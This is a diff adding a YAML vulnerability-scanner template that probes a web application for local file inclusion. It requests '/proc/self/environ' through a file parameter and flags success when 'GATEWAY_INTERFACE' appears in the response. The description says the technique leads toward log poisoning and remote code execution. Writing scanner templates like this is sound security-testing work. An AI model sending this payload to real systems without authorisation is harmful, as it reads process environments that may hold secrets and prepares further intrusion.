@@ -1,0 +1,23 @@
+id: patt-lfi-proc-01-file
+name: 'PATT lfi patt-lfi-proc-01 via file'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+requires:
+  - php
+  - python
+  - node
+description: 'PATT Linux Files: environ (jalan ke log-poisoning/RCE). [patt:patt-lfi-proc-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      file:
+        - '/proc/self/environ'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'GATEWAY_INTERFACE'
